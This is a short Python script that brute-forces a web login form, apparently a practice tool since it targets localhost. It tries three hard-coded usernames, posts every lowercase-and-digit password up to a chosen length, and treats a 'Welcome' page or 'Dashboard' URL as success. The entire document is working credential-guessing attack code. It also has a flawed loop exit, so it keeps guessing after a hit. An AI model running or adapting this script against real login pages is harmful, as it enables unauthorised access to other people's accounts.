import requests
import itertools
import string

#Data used in script
url = "http://localhost/login.php" 
login = ["admin", "admin123", "user"] 
chars = string.ascii_lowercase + string.digits
pass_range = int(input("Set maximum range for a password: "))

#Loop responsible for changig logins
for usr in login:
    #Loop responsible for choosing password length
    for length in range(1, pass_range + 1):
        #Loop responsible for brute-force attack on chosen login
        for payload in itertools.product(chars, repeat=length):
            #Making payload for password cracking
            password = ''.join(payload)
            data = {
                "username": usr,
                "password": password
            }
            #Using payload
            response = requests.post(url, data=data)

            #Checking if payload was successfull
            if "Welcome" in response.text or "Dashboard" in response.url:
                print(f"Payload: {usr}:{password} was succesful")
                break
            print(f"Current password and user: {usr}:{password}")


